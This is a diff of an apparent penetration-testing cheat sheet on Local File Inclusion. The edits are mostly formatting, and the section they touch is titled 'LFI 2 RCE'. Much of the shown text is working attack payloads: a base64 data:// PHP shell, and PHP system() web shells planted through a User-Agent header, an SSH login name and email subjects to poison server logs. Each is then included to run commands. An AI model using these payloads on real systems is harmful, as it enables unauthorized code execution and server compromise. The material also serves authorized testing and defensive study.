@@ -1,9 +1,9 @@
-# 📂 File Inclusion
+# LFI
 
-## Local File Inclusions (LFI)&#x20;
+## Local File Inclusions (LFI)
 
 {% hint style="info" %}
-An attacker can use **Local File Inclusion** (LFI) to trick the web application into exposing or running files on the web server. An LFI attack may lead to information disclosure, remote code execution, or even XSS.&#x20;
+An attacker can use **Local File Inclusion** (LFI) to trick the web application into exposing or running files on the web server. An LFI attack may lead to information disclosure, remote code execution, or even XSS.
 
 Typically, LFI occurs when an application uses the **path to a file as input**. If the application treats this input as trusted, a local file may be used in the include statement.
 {% endhint %}
@@ -84,21 +84,28 @@ http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbW
 ```
 
 ## LFI 2 RCE
+
 ### /proc/self/environ
->Like a log file :
+
+> Like a log file :
+
 ```
 GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
 User-Agent: <?=phpinfo(); ?>
 ```
 
 ### via SSH
+
 ```bash
 ssh <?php system($_GET["cmd"]);?>@10.10.10.10
 # Then include the SSH log files inside the Web Application :
 # http://example.com/index.php?page=/var/log/auth.log&cmd=id
 ```
+
 ### via MAIL
->First send an email using the open SMTP then include the log file located at http://example.com/index.php?page=/var/log/mail.
+
+> First send an email using the open SMTP then include the log file located at http://example.com/index.php?page=/var/log/mail.
+
 ```bash
 root@kali:~# telnet 10.10.10.10. 25
 Trying 10.10.10.10....
@@ -117,7 +124,9 @@ subject: <?php echo system($_GET["cmd"]); ?>
 data2
 .
 ```
->In some cases you can also send the email with the mail command line.
+
+> In some cases you can also send the email with the mail command line.
+
 ```bash
 mail -s "<?php system($_GET['cmd']);?>" www-data@10.10.10.10. < /dev/null
 ```
